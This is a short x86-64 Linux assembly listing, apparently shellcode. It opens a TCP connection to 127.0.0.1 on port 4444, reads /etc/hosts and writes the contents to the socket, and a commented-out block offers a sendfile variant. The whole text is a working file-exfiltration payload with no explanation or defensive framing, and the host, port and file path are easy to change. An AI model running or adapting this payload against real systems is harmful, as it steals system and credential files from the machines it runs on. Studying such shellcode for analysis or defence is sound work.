_start:
; Socket
	mov rax, 41
	mov rdi, 2
	mov rsi, 1
	mov rdx, 0
	syscall

; Connect
	xchg rdi, rax
	mov rax, 42
	mov rdx, 16
	push 0x0100007f 	;127.0.0.1
	push word 0x5c11	;4444
	push word 2
	mov rsi, rsp
	syscall

;open
	mov r8, rdi
	mov rax, 2
	mov rdi, "/etc/hos"
	push "ts"
	push rdi
	mov rdi, rsp
	xor rsi, rsi
	syscall

;read
	mov rdi, rax
	mov rsi, rsp
	mov rdx, 0xff
	mov rax, 0
	syscall

;write
	mov rdi, r8
	mov rax, 1
	syscall

;exit
	mov rax, 60
	syscall

;sendfile
;	mov rsi, rax
;	mov rdi, r8
;	mov rdx, 0
;	mov rcx, 0xff
;	mov rax, 40
;	syscall
